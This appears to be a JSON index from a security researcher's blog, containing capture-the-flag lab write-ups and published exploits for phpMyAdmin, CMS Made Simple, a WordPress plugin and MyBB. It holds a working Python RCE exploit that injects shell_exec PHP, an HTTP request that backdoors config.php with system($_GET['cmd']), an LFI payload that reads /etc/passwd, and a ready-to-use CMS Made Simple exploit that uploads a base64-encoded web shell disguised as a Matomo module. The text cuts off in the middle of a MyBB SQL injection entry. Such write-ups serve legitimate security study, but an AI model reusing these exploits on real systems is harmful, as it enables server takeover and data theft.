http://byk4piiac0ltnaqgssdnhrjdr.public1.attackdefenselabs.com/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php5/sess_5s02743ikru46a31086rrjr8jras81jqAll good, the challenge is complete! I decided to create this PoC as there was no one publicly available exploit at the moment of this article. Here is my Python exploit:import requestsVALID_PHPMYADMIN_URL = \"http://byk4piiac0ltnaqgssdnhrjdr.public1.attackdefenselabs.com:80\"VALID_PHPMYADMIN_SESSION = \"5s02743ikru46a31086rrjr8jras81jq\"burp0_url = VALID_PHPMYADMIN_URL + \"/import.php\"burp0_cookies = {\"phpMyAdmin\": VALID_PHPMYADMIN_SESSION, \"pma_lang\": \"en\", \"pmaUser-1\": \"%7B%22iv%22%3A%22N2lLHGoe2cuUN5uvAbz8ww%3D%3D%22%2C%22mac%22%3A%222b02670d8802823d99c3ccaf1f0ece9f2eb4c536%22%2C%22payload%22%3A%22mR69lSBATnU%2B%2Bs5jL0c3yw%3D%3D%22%7D\", \"pmaAuth-1\": \"%7B%22iv%22%3A%22xoIEoAgAvAxL%5C%2F%5C%2Fa3c0iX8Q%3D%3D%22%2C%22mac%22%3A%22243d87482efacdde27e3d2a6c6e85ae3b903af66%22%2C%22payload%22%3A%22yl27EG%5C%2FIUngUnyZIKNa8O45enMc8iZyHjFpLmiDkWSs%3D%22%7D\"}burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"X-Requested-With\": \"XMLHttpRequest\", \"Connection\": \"close\"}burp0_data={\"is_js_confirmed\": \"0\", \"token\": \"?[I568P@ei7B?OUd\", \"pos\": \"0\", \"goto\": \"server_sql.php\", \"message_to_show\": \"Your SQL query has been executed successfully.\", \"prev_sql_query\": '', \"sql_query\": \"select '&lt;?php $output = shell_exec(\\\"ls -al; date; id;\\\");echo \\\"&lt;pre&gt;$output&lt;/pre&gt;\\\";exit;?&gt;'\", \"sql_delimiter\": \";\", \"show_query\": \"1\", \"fk_checks\": \"0\", \"fk_checks\": \"1\", \"SQL\": \"Go\", \"ajax_request\": \"true\", \"ajax_page_request\": \"true\", \"_nocache\": \"1543255823534938840\", \"token\": \"?[I568P@ei7B?OUd\"}requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)print \"While autentificated:\"print \"- Please check: \" + VALID_PHPMYADMIN_URL + \"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_\" + VALID_PHPMYADMIN_SESSIONprint \"- Please check: \" + VALID_PHPMYADMIN_URL + \"/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php5/sess_\" + VALID_PHPMYADMIN_SESSION" }, { "title": "AttackDefense.com [RCE] - CVE-2018-7448 Exploit", "url": "/nitesculucian.github.io/2018/11/25/attackdefense-com-rce-cve-2018-7448-exploit/", "categories": "AttackDefense.com, ctf, writeups, CVE-2018, RCE", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-25 22:39:00 +0200", "snippet": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Remote Code Execution vulnerabilities ...", "content": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Remote Code Execution vulnerabilities could be triggered even by unauthenticated users.In the exercise below, the attacker is not authenticated to the web application and needs to find a remote code execution attack to execute arbitrary commands on the server.CMS Made Simple is a free, open source content management system to manage websites or web portals written in PHP.CMS Made Simple (2.1.6) is vulnerable to a Remote Code Execution documented in CVE-2018-7448.Objective: Your task is to find and exploit this vulnerability.Level difficulty: IntermediateCategory: Webapps CVEs &gt; Remote Code ExecutionSolutionOn this lab, I got a basic installation of CMS Made Simple (2.1.6) which is known to be vulnerable.After searching for the specific version of the CMS application on the internet, I discovered this exploit link: https://www.exploit-db.com/exploits/44192/Arbitrary PHP code can be injected into the configuration file (config.php) after installation has been finished. In order to inject PHP code, fresh install and valid database credentials are required. Next step is to proceed with the CMS installation on the following link: http://jvria5vb563wevd50mt5op1pb.public2.attackdefenselabs.com/cmsms-2.1.6-install.php/index.phpOn step 4, we can spot our vulnerable input, and we can observe that the database credentials are auto filled in, for us to use:When pressing next, the following request is performed:In order to exploit the known vulnerability, I updated the request in order to include the backdoor payload:Here is an exact copy of the installation step 4 request:POST /cmsms-2.1.6-install.php/index.php?mec6d93f0=4 HTTP/1.1Host: jvria5vb563wevd50mt5op1pb.public2.attackdefenselabs.comUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://jvria5vb563wevd50mt5op1pb.public2.attackdefenselabs.com/cmsms-2.1.6-install.php/index.php?mec6d93f0=4Content-Type: application/x-www-form-urlencodedContent-Length: 80Connection: closeCookie: CMSICd5c5cea1d0=70e72cvsubnlpsnoef9tvjdr64; CMSSESSID05d11d962997=q21dk94sh5dr1f4r436lm7vfs2Upgrade-Insecure-Requests: 1dbhost=localhost&amp;dbname=app&amp;dbuser=root&amp;dbpass=&amp;timezone=junk';echo%20system($_GET['cmd']);$junk='junk&amp;next=Next+%E2%86%92Next, I had to finish the CMS installation in order to backdoor our config.php page.We can execute code using the following public available backdoor on config.php using the cmd parameter: http://jvria5vb563wevd50mt5op1pb.public2.attackdefenselabs.com/config.php?cmd=id http://jvria5vb563wevd50mt5op1pb.public2.attackdefenselabs.com/config.php?cmd=date" }, { "title": "AttackDefense.com [LFI] - CVE-2018-7422 Exploit", "url": "/nitesculucian.github.io/2018/11/11/attackdefense-com-lfi-cve-2018-7422-exploit/", "categories": "AttackDefense.com, ctf, writeups, LFI", "tags": "writeups, CTF, challange, AttackDefense.com", "date": "2018-11-11 23:57:00 +0200", "snippet": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Local File Inclusion vulnerabilities c...", "content": "MissionThe attacker might not have any user level access to the web application. However, this does not mean that the application cannot be attacked remotely. Local File Inclusion vulnerabilities could be triggered even by unauthenticated users.In the exercise below, the attacker is unauthenticated to the web application and needs to find a local file inclusion attack to access sensitive files from the server.WordPress is a free and open source full-featured CMS for hosting blogs and web portals. It is based on PHP and MySQL. It is one of the most popular CMS.WordPress Site Editor Plugin (1.1.1) is vulnerable to Local File Inclusion documented in CVE-2018-7422.Objective: Your task is to find and exploit this vulnerability.Level difficulty: EasyCategory: Webapps CVEs &gt; Local File InclusionSolutionThe lab started with a real copy of a default WordPress installation with one additional plugin which is vulnerable to Local File Inclusion.After searching on the internet for CVE-2018-7422 exploits I have discovered the following resource: https://www.exploit-db.com/exploits/44340/In order to retrieve the /etc/passwd file contents, I used the following payload: http://mvwv0w4bnljuakkri3kmb3u32.public2.attackdefenselabs.com/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd" }, { "title": "CMS Made Simple 2.2.7 - Remote Code Execution", "url": "/nitesculucian.github.io/2018/11/07/cms-made-simple-2-2-7-remote-code-execution/", "categories": "my_exploits, offensive_security", "tags": "exploit, rce, command injection, security, hacking, CMS, CMS Made Simple, vulnerability, Remote Code Execution", "date": "2018-11-07 02:19:00 +0200", "snippet": "CMS Made Simple is an Open Source Content Management System. It’s built using PHP and the Smarty Engine, which keeps content, functionality, and templates separated.Intial Submissions# Exploit Titl...", "content": "CMS Made Simple is an Open Source Content Management System. It’s built using PHP and the Smarty Engine, which keeps content, functionality, and templates separated.Intial Submissions# Exploit Title: CMS Made Simple 2.2.7 - Remote Code Execution# Date: 2018-11-04# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://www.cmsmadesimple.org/# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/# Version: 2.2.7# Tested on: Ubuntu 18.04# CVE: CVE-2018-10517 # 1. Description: # An attacker or a malicious user with access to the administration interface can execute code on the server. # 2. Proof of Concept: import requests # target configuration (required admin credentials in order to obtain a valid session) target_url=\"&lt;YOUR HTTP(S):// URL&gt;\"session_cookie = \"&lt;YOUR SESSION COOKIE NAME&gt;\"session_value = \"&lt;YOUR SESSION COOKIE VALUE&gt;\" # upload of shell unde the name of Matomo plugin burp0_url = target_url + \"/admin/moduleinterface.php\" burp0_cookies = {session_cookie: session_value}burp0_headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Referer\": \"http://gk1v1ml3nfrd1bs00o69fmwnh.public2.attackdefenselabs.com/\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------207726338310671742711263591267\", \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\"}burp0_data=\"-----------------------------207726338310671742711263591267\\r\\nContent-Disposition: form-data; name=\\\"mact\\\"\\r\\n\\r\\nModuleManager,m1_,local_import,0\\r\\n-----------------------------207726338310671742711263591267\\r\\nContent-Disposition: form-data; name=\\\"__c\\\"\\r\\n\\r\\n9a63802b6c4579cc01c\\r\\n-----------------------------207726338310671742711263591267\\r\\nContent-Disposition: form-data; name=\\\"m1_upload\\\"; filename=\\\"test.xml\\\"\\r\\nContent-Type: text/xml\\r\\n\\r\\n&lt;module&gt;\\n &lt;dtdversion&gt;1.3&lt;/dtdversion&gt;\\n &lt;name&gt;Matomo&lt;/name&gt;\\n &lt;version&gt;0.0.1&lt;/version&gt;\\n &lt;mincmsversion&gt;2.1.5&lt;/mincmsversion&gt;\\n &lt;help&gt;&lt;![CDATA[LS0gTWlzc2luZyBMYW5ndWFnZXN0cmluZzogaGVscCAtLQ==]]&gt;&lt;/help&gt;\\n &lt;about&gt;&lt;![CDATA[PGJyIC8+QXV0aG9yOiBleWVkZWUtbWVkaWEgJmx0O21vcnRlbkBwb3Vsc2VuLm9yZyZndDs8YnIgLz48YnIgLz5WZXJzaW9uOiAwLjAuMTxiciAvPjxiciAvPkNoYW5nZSBIaXN0b3J5OjxiciAvPi0tIE1pc3NpbmcgTGFuZ3VhZ2VzdHJpbmc6IGNoYW5nZWxvZyAtLTxiciAvPg==]]&gt;&lt;/about&gt;\\n &lt;description&gt;&lt;![CDATA[-- Missing Languagestring: admindescription --]]&gt;&lt;/description&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/&lt;/filename&gt;\\n &lt;isdir&gt;1&lt;/isdir&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.admin_settings.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PCEtLSBTaW1wbGUgUEhQIEJhY2tkb29yIEJ5IERLIChPbmUtTGluZXIgVmVyc2lvbikgLS0+DQo8IS0tIFVzYWdlOiBodHRwOi8vdGFyZ2V0LmNvbS9zaW1wbGUtYmFja2Rvb3IucGhwP2NtZD1jYXQrL2V0Yy9wYXNzd2QgLS0+DQo8P3BocCBpZihpc3NldCgkX1JFUVVFU1RbJ2NtZCddKSl7IGVjaG8gIjxwcmU+IjsgJGNtZCA9ICgkX1JFUVVFU1RbJ2NtZCddKTsgc3lzdGVtKCRjbWQpOyBlY2hvICI8L3ByZT4iOyBkaWU7IH0/Pg==]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.admin_statistics.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQokYXBpdG9rZW4gPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJhcGl0b2tlbiIpOw0KJHNpdGVpZD0kdGhpcy0+R2V0UHJlZmVyZW5jZSgic2l0ZWlkIik7DQokbGFuZ3VhZ2U9JHRoaXMtPkdldFByZWZlcmVuY2UoImxhbmd1YWdlIiwiZW4iKTsNCg0KJGVtYmVkX2Rhc2hib2FyZCA9ICc8aWZyYW1lIHN0eWxlPSJkaXNwbGF5OmJsb2NrOyIgc3JjPSInIC4gJHRoaXMtPkdldFByZWZlcmVuY2UoImJhc2V1cmwiKQ0KICAuICcvaW5kZXgucGhwP21vZHVsZT1XaWRnZXRpemUmYWN0aW9uPWlmcmFtZSZtb2R1bGVUb1dpZGdldGl6ZT1EYXNoYm9hcmQmYWN0aW9uVG9XaWRnZXRpemU9aW5kZXgmaWRTaXRlPScgLiAkc2l0ZWlkDQogIC4gJyZ0b2tlbl9hdXRoPScgLiAkYXBpdG9rZW4NCiAgLiAnJnBlcmlvZD1tb250aCcNCiAgLiAnJmRhdGU9dG9kYXknDQogIC4gJyZsYW5ndWFnZT0nLiRsYW5ndWFnZQ0KICAuICciIGZyYW1lYm9yZGVyPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIG1hcmdpbndpZHRoPSIwIiB3aWR0aD0iMTAwJSIgaGVpZ2h0PSI4MDBweCcNCiAgLiAnIj48L2lmcmFtZT4nOw0KDQoNCmVjaG8gJGVtYmVkX2Rhc2hib2FyZDsNCg0KDQoNCi8qDQplY2hvICR0aGlzLT5TdGFydFRhYkhlYWRlcnMoKTsNCg0KZWNobyAkdGhpcy0+U2V0VGFiSGVhZGVyKCJiYXNlIiwiU2lkZXIiLCgkdGFiPT0icGFnZXMiKSk7DQplY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoInNla3Rpb25lciIsIlNla3Rpb25lciIsKCR0YWI9PSJzZWN0aW9ucyIpKTsNCi8vICBlY2hvICR0aGlzLT5TZXRUYWJIZWFkZXIoImluZHN0aWxsaW5nZXIiLCJJbmRzdGlsbGluZ2VyIiwoJHRhYj09InNldHRpbmdzIikpOw0KZWNobyAkdGhpcy0+RW5kVGFiSGVhZGVycygpOw0KDQplY2hvICR0aGlzLT5TdGFydFRhYkNvbnRlbnQoKTsNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJzaWRlciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KZWNobyAkdGhpcy0+U3RhcnRUYWIoInNla3Rpb25lciIpOw0KDQplY2hvICR0aGlzLT5FbmRUYWIoKTsNCg0KLyoNCmVjaG8gJHRoaXMtPlN0YXJ0VGFiKCJ1cGxvYWQiKTsNCiAgaW5jbHVkZV9vbmNlKGRpcm5hbWUoX19maWxlX18pLiIvdGFiLmluZHN0aWxsaW5nZXIucGhwIik7DQogIGVjaG8gJHRoaXMtPkVuZFRhYigpOw0KKi8NCi8vZWNobyAkdGhpcy0+RW5kVGFiQ29udGVudCgpOw0KDQoNCg0KLyoNCiRhcGl0b2tlbiA9JHRoaXMtPkdldFByZWZlcmVuY2UoImFwaXRva2VuIik7DQokc2l0ZWlkPSR0aGlzLT5HZXRQcmVmZXJlbmNlKCJzaXRlaWQiKTsNCg0KLy8gd2UgY2FsbCB0aGUgUkVTVCBBUEkgYW5kIHJlcXVlc3QgdGhlIDEwMCBmaXJzdCBrZXl3b3JkcyBmb3IgdGhlIGxhc3QgbW9udGggZm9yIHRoZSBpZHNpdGU9Nw0KJHVybCA9ICR0aGlzLT5HZXRQcmVmZXJlbmNlKCJiYXNldXJsIik7DQokdXJsIC49ICI/bW9kdWxlPUFQSSZtZXRob2Q9UmVmZXJyZXJzLmdldEtleXdvcmRzIjsNCiR1cmwgLj0gIiZpZFNpdGU9JHNpdGVpZCZwZXJpb2Q9bW9udGgmZGF0ZT15ZXN0ZXJkYXkiOw0KJHVybCAuPSAiJmZvcm1hdD1QSFAmZmlsdGVyX2xpbWl0PTIwIjsNCiR1cmwgLj0gIiZ0b2tlbl9hdXRoPSRhcGl0b2tlbiI7DQoNCiRmZXRjaGVkID0gZmlsZV9nZXRfY29udGVudHMoJHVybCk7DQovL2VjaG8gJGZldGNoZWQ7cmV0dXJuOw0KJGNvbnRlbnQgPSB1bnNlcmlhbGl6ZSgkZmV0Y2hlZCk7DQovL3ByaW50X3IoJGNvbnRlbnQpO3JldHVybjsNCg0KLy8gY2FzZSBlcnJvcg0KaWYgKCEkY29udGVudCkgew0KICBwcmludCgiRXJyb3IgcGFyc2luZyBkYXRhLCBjb250ZW50IGZldGNoZWQgPSAiIC4gJGZldGNoZWQpOw0KICByZXR1cm47DQp9DQoNCmlmICgkY29udGVudFsicmVzdWx0Il09PSJlcnJvciIpIHsNCiAgcHJpbnQoIkVycm9yLCBtZXNzYWdlID0gIiAuICRjb250ZW50WyJtZXNzYWdlIl0pOw0KICByZXR1cm47DQp9DQoNCnByaW50KCI8aDE+S2V5d29yZHMgZm9yIHRoZSBsYXN0IG1vbnRoPC9oMT5cbiIpOw0KZm9yZWFjaCAoJGNvbnRlbnQgYXMgJHJvdykgew0KICAka2V5d29yZCA9IGh0bWxzcGVjaWFsY2hhcnMoaHRtbF9lbnRpdHlfZGVjb2RlKHVybGRlY29kZSgkcm93WydsYWJlbCddKSwgRU5UX1FVT1RFUywgJ1VURi04JyksIEVOVF9RVU9URVMsICdVVEYtOCcpOw0KICAkaGl0cyA9ICRyb3dbJ25iX3Zpc2l0cyddOw0KDQogIHByaW50KCI8Yj4ka2V5d29yZDwvYj4gKCRoaXRzIGhpdHMpPGJyPlxuIik7DQp9DQoqLw0K]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.default.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCg0KZWNobyAkdGhpcy0+TmVvUHJvY2Vzc1RlbXBsYXRlRnJvbURhdGEoJHRoaXMtPkdldFRyYWNraW5nQ29kZSgpKTs=]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/action.savesettings.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCmlmICghZnVuY3Rpb25fZXhpc3RzKCJjbXNtcyIpKSByZXR1cm47DQppZiggISR0aGlzLT5DaGVja1Blcm1pc3Npb24oJ01vZGlmeSBTaXRlIFByZWZlcmVuY2VzJykgKSByZXR1cm47DQoNCg0KJHRoaXMtPk5lb1NhdmVWYWx1ZXMoJHBhcmFtcyxhcnJheSgNCiAgImJhc2V1cmwiLA0KICAidHJhY2tpbmdjb2RlIiwNCiAgImFwaXRva2VuIiwNCiAgInNpdGVpZCINCikpOw0KDQokdGhpcy0+UmVkaXJlY3QoJGlkLCAnYWRtaW5fc2V0dGluZ3MnLCAkcmV0dXJuaWQsYXJyYXkoInRhYiI9PiJzZXR0aW5ncyIsIm1vZHVsZV9tZXNzYWdlIj0+JHRoaXMtPkxhbmcoInNldHRpbmdzc2F2ZWQiKSkpOw0K]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/lang/&lt;/filename&gt;\\n &lt;isdir&gt;1&lt;/isdir&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/lang/en_US.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[PD9waHANCi8qKg0KICogQ3JlYXRlZCBieSBQaHBTdG9ybS4NCiAqIFVzZXI6IG1vcnRlbg0KICogRGF0ZTogMjctMDktMjAxOA0KICogVGltZTogMDg6NTMNCiAqLw0KDQoNCiRsYW5nWyJ0aXRsZV9zdGF0aXN0aWNzIl09Ik1hdG9tbyBTdGF0aXN0aWNzIjsNCiRsYW5nWyJ0aXRsZV9zZXR0aW5ncyJdPSJNYXRvbW8gU2V0dGluZ3MiOw0KDQokbGFuZ1siYmFzZXVybCJdPSJCYXNlIFVSTCI7DQokbGFuZ1siYmFzZXVybGhlbHAiXT0iVGhlIGJhc2UgdXJsIG9mIHRoZSBNYXRvbW8taW5zdGFsbGF0aW9uLiBQbGVhc2UgaW5jbHVkZSBodHRwOi8vIG9yIGh0dHBzOi8vIjsNCiRsYW5nWyJhcGl0b2tlbiJdPSJBUEkgdG9rZW4iOw0KJGxhbmdbImFwaXRva2VuaGVscCJdPSJUaGUgQVBJIHRva2VuIGZvciBhY2Nlc3NpbmcgTWF0b21vLiBDYW4gYmUgb2J0YWluZWQgYWZ0ZXIgbG9nZ2luZyBpbnRvIHRoZSBNYXRvbW8gaW5zdGFsbGF0aW9uIjsNCiRsYW5nWyJzaXRlaWQiXT0iU2l0ZSBJRCI7DQokbGFuZ1sic2l0ZWlkaGVscCJdPSJUaGUgSUQgb2YgdGhlIHNpdGUgYXMgc2VlbiBieSB0aGUgTWF0b21vIGluc3RhbGxhdGlvbiI7DQokbGFuZ1sidHJhY2tpbmdjb2RlIl09IlRyYWNraW5nIGNvZGUiOw0KJGxhbmdbInRyYWNraW5nY29kZWhlbHAiXT0iVGhlIHRyYWNraW5nIGNvZGUgZnJvbSBNYXRvbW8gKHRoaXMgd2lsbCBwcm9iYWJseSBiZSBhdXRvZ2VuZXJhdGVkIGF0IGEgbGF0ZXIgdmVyc2lvbikiOw0KJGxhbmdbInNhdmVzZXR0aW5ncyJdPSJTYXZlIHNldHRpbmdzIjsNCiRsYW5nWyJzZXR0aW5nc3NhdmVkIl09IlNldHRpbmdzIHNhdmVkIjs=]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/Matomo.module.php&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/moduleinfo.ini&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[W21vZHVsZV0KbmFtZSA9ICJNYXRvbW8iCnZlcnNpb24gPSAiMC4wLjEiCmF1dGhvciA9ICJleWVkZWUtbWVkaWEiCmF1dGhvcmVtYWlsID0gIm1vcnRlbkBwb3Vsc2VuLm9yZyIKbWluY21zdmVyc2lvbiA9ICIyLjEuNSIKbGF6eWxvYWRhZG1pbiA9IDAKbGF6eWxvYWRmcm9udGVuZCA9IDAK]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/templates/&lt;/filename&gt;\\n &lt;isdir&gt;1&lt;/isdir&gt;\\n &lt;/file&gt;\\n &lt;file&gt;\\n &lt;filename&gt;/templates/adminsettings.tpl&lt;/filename&gt;\\n &lt;isdir&gt;0&lt;/isdir&gt;\\n &lt;data&gt;&lt;![CDATA[e2Zvcm1fc3RhcnQgYWN0aW9uPSJzYXZlc2V0dGluZ3MifQ0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQxIj57JG1vZC0+bGFuZygiYmFzZXVybCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkMSIgdHlwZT0idGV4dCIgc2l6ZT0iNjQiIGxlbmd0aD0iNjQiIHZhbHVlPSJ7JG1vZC0+cHJmKCJiYXNldXJsIil9IiBuYW1lPSJ7JGFpZH1iYXNldXJsIj57JG1vZC0+bGFuZygiYmFzZXVybGhlbHAiKX0NCiAgICA8L3A+DQo8L2Rpdj4NCg0KPGRpdiBjbGFzcz0icGFnZW92ZXJmbG93Ij4NCiAgICA8cCBjbGFzcz0icGFnZXRleHQiPg0KICAgICAgICA8bGFiZWwgZm9yPSJ7JGFpZH1mbGQzIj57JG1vZC0+bGFuZygiYXBpdG9rZW4iKX06PC9sYWJlbD4geypjbXNfaGVscCBrZXk9J2hlbHBfYXJ0aWNsZV91c2VleHBpcnknIHRpdGxlPSR1c2VleHBpcmF0aW9udGV4dCp9DQogICAgPC9wPg0KICAgIDxwIGNsYXNzPSJwYWdlaW5wdXQiPg0KICAgICAgICA8aW5wdXQgaWQ9InskYWlkfWZsZDMiIHR5cGU9InRleHQiIHNpemU9IjY0IiBsZW5ndGg9IjY0IiB2YWx1ZT0ieyRtb2QtPnByZigiYXBpdG9rZW4iKX0iIG5hbWU9InskYWlkfWFwaXRva2VuIj57JG1vZC0+bGFuZygiYXBpdG9rZW5oZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkNCI+eyRtb2QtPmxhbmcoInNpdGVpZCIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDxpbnB1dCBpZD0ieyRhaWR9ZmxkNCIgdHlwZT0idGV4dCIgc2l6ZT0iOCIgbGVuZ3RoPSI4IiB2YWx1ZT0ieyRtb2QtPnByZigic2l0ZWlkIil9IiBuYW1lPSJ7JGFpZH1zaXRlaWQiPnskbW9kLT5sYW5nKCJzaXRlaWRoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCiAgICAgICAgPGxhYmVsIGZvcj0ieyRhaWR9ZmxkMiI+eyRtb2QtPmxhbmcoInRyYWNraW5nY29kZSIpfTo8L2xhYmVsPiB7KmNtc19oZWxwIGtleT0naGVscF9hcnRpY2xlX3VzZWV4cGlyeScgdGl0bGU9JHVzZWV4cGlyYXRpb250ZXh0Kn0NCiAgICA8L3A+DQogICAgPHAgY2xhc3M9InBhZ2VpbnB1dCI+DQogICAgICAgIDx0ZXh0YXJlYSBpZD0ieyRhaWR9ZmxkMiIgcm93cz0iMTIiIGNvbHM9IjQwIiBuYW1lPSJ7JGFpZH10cmFja2luZ2NvZGUiPnskbW9kLT5wcmYoInRyYWNraW5nY29kZSIpfTwvdGV4dGFyZWE+DQogICAgICAgIDxici8+DQogICAgICAgIHskbW9kLT5sYW5nKCJ0cmFja2luZ2NvZGVoZWxwIil9DQogICAgPC9wPg0KPC9kaXY+DQoNCjxkaXYgY2xhc3M9InBhZ2VvdmVyZmxvdyI+DQogICAgPHAgY2xhc3M9InBhZ2V0ZXh0Ij4NCg0KICAgIDwvcD4NCiAgICA8cCBjbGFzcz0icGFnZWlucHV0Ij4NCiAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ieyRhaWR9c3VibWl0IiB2YWx1ZT0ieyRtb2QtPmxhbmcoInNhdmVzZXR0aW5ncyIpfSIvPg0KICAgIDwvcD4NCjwvZGl2Pg0KDQoNCntmb3JtX2VuZH0NCg==]]&gt;&lt;/data&gt;\\n &lt;/file&gt;\\n&lt;/module&gt;\\r\\n-----------------------------207726338310671742711263591267--\\r\\n\"requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data) print \"Try to access your web shell at: \" + target_url + \"/modules/Matomo/action.admin_settings.php?cmd=ls%20-al\"Public appearances Exploit Database: https://www.exploit-db.com/exploits/45793/ Packet Storm Security: https://packetstormsecurity.com/files/150173/CMS-Made-Simple-2.2.7-Remote-Code-Execution.html 0day.today: https://0day.today/exploit/31537 CXSecurity: https://cxsecurity.com/issue/WLB-2018110031Other references https://nitesculucian.github.io/2018/11/03/attackdefense-com-rce-cve-2018-10517-exploit/ https://www.cvedetails.com/vulnerability-list/vendor_id-3206/product_id-5627/version_id-240781/Cmsmadesimple-Cms-Made-Simple-2.2.7.html" }, { "title": "MyBB Downloads 2.0.3 - SQL Injection", "url": "/nitesculucian.github.io/2018/11/07/mybb-downloads-2-0-3-sql-injection/", "categories": "my_exploits, offensive_security", "tags": "exploit, security, hacking, MyBB, MyBB Downloads, vulnerability, SQLi", "date": "2018-11-07 02:17:00 +0200", "snippet": "MyBB Downloads it is a plugin (MyBB) which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.Intial Submissions# Exploit Title: MyBB ...", "content": "MyBB Downloads it is a plugin (MyBB) which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval.Intial Submissions# Exploit Title: MyBB Downloads 2.0.3 - SQL Injection# Date: 28-10-2018# Exploit Author: Lucian Ioan Nitescu# Contact: https://twitter.com/LucianNitescu# Webiste: https://nitesculucian.github.io# Vendor Homepage: https://github.com/vintagedaddyo/MyBB_Plugin-Downloads# Software Link: https://github.com/vintagedaddyo/MyBB_Plugin-Downloads# Version: 2.0.3# Tested on: Ubuntu 18.04 1. Description: It is a plugin which adds a page to download files. If enabled, regular members can add new downloads to the page after admin approval. 2. Proof of Concept: Persistent XSS - Go to downloads.php page - Create a New Download - Add the following to the title: a\"- Now on submit, the user will be prompted to an SQL 